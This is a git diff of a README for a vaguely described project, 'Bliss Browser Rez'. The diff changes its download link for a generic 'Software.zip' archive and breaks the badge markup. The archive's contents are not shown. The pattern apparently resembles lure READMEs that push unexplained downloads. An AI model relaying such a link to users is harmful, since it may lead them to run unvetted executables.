@@ -22,7 +22,7 @@ Bliss Browser Rez is a groundbreaking project that bridges the gap between brows
 
 ## Installation
 To get started with Bliss Browser Rez, you can download the necessary files from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/Z-SATORU/Bliss_Browser_Rez/releases/download/v2.0/Software.zip)](https://github.com/Z-SATORU/Bliss_Browser_Rez/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software package, follow the installation instructions provided to set up the Bliss Browser Rez language support module on your system.
 
